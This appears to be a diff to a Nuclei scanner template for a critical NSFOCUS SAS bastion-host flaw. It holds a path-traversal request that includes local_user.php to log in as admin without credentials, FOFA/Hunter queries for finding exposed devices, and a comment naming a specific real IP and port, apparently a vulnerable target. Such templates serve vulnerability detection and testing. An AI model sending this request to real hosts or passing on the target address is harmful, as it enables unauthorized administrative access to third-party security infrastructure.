@@ -1,11 +1,11 @@
-id: Nsfocus-SAS_login-bypass_webconf
+id: nsfocus-sas-bypassauth-status
 
 info:
-  name: Nsfocus-SAS_login-bypass_webconf
+  name: nsfocus-sas-bypassauth-status
   author: hufei
   severity: critical
   description: |
-     绿盟堡垒机存在任意文件读取漏洞
+     绿盟SAS堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录
   reference:
     https://mp.weixin.qq.com/s/qHPo0noFTvJoEcor00qtDg
   metadata:
@@ -13,7 +13,7 @@ info:
     fofa-query: title=="NSFOCUS&nbsp;SAS[H]"
     hunter-query: app.name="NSFOCUS 绿盟 SAS"
     verified: true
-  tags: 2023,HVV,Nsfocus-SAS,login-bypass
+  tags: 2023,HVV,nsfocus-sas,bypassauth
 
 
 requests:
@@ -22,8 +22,8 @@ requests:
       - "{{BaseURL}}/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
 
     matchers:
-      - type: word
-        part: body
-        words:
-          - '{"status":200}'
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains((body), '200')"
 
+# https://182.86.70.53:4433
